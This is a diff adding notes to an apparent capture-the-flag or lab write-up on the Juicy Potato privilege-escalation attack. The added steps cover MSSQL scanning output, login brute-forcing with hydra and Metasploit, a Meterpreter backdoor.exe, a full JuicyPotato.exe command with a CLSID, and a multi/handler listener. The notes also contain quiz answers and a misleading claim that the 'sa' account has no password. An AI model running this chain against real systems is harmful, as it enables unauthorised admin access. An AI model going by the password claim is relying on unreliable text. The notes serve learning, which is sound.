@@ -200,6 +200,42 @@ By duplicating and adjusting the token, the exploit achieves privilege escalatio
 
 What type of Windows access token does the Juicy Potato attack primarily aim to obtain? > System token
 What is a common technique used to create/obtain a Windows access token for impersonation, leading to privilege escalation? > token duplicating
+
+ ms-sql-info: 
+|   10.0.16.124:1433: 
+|     Version: 
+|       name: Microsoft SQL Server 2019 RTM
+|       number: 15.00.2000.00
+|       Product: Microsoft SQL Server 2019
+|       Service pack level: RTM
+|       Post-SP patches applied: false
+|_    TCP port: 1433
+
+bruteforce mssql username and password
+--------------------------------------
+1. hydra
+2. mssql_login (msfconsole payload)
+
+The default system administrator account in Microsoft SQL Server (MSSQL) is named sa, which stands for "System Administrator.", it has no password.
+
+3. Login into mssql with mssql_payload (msfconsole payload)
+
+CLSID
+------
+Each service or component in Windows that uses the Component Object Model (COM) architecture has its own COM object classes,
+and each of these classes is uniquely identified by a Class Identifier (CLSID).
+
+4. Create meterpreter exe file (backdoor.exe)
+
+5. Run that command in user session
+C:> JuicyPotato.exe -l 3333 -p backdoor.exe -t * -c {4991d34b-80a1-4291-83b6-3328366b9097}
+
+The -t option specifies the tokens to use for impersonation. The * symbol indicates that Juicy Potato should use any available token. 
+This allows the tool to attempt to find a token that has the necessary privileges for the exploit to succeed
+
+6. listen with multi/handler
+
+Finally, got the administrator.
 ________________________________________________________________________________________________________________________________________________________________________
 
 
